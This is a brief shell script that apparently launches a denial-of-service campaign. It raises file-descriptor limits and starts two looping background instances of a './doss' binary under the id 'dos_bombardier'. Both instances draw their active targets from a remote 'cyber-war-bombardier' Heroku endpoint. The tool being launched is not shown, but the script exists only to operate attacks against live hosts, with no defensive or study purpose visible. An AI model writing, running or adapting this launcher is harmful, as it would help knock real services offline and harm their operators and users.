DIR="$( cd "$( dirname "$0" )" && pwd )"
cd "$DIR"

./stop.sh

ulimit -n 5000

instance_id=dos_bombardier

filter="instance.id=$instance_id"
nohup ./loop.sh ./doss "https://cyber-war-bombardier.herokuapp.com/json?activeOnly" instance.id=$instance_id >> doss.log 2>&1 & echo ok
sleep 2m 30s
nohup ./loop.sh ./doss "https://cyber-war-bombardier.herokuapp.com/json?activeOnly" instance.id=$instance_id >> doss2.log1 2>&1 & echo ok
printf "\n"
ps -v | grep $filter
printf "\n"
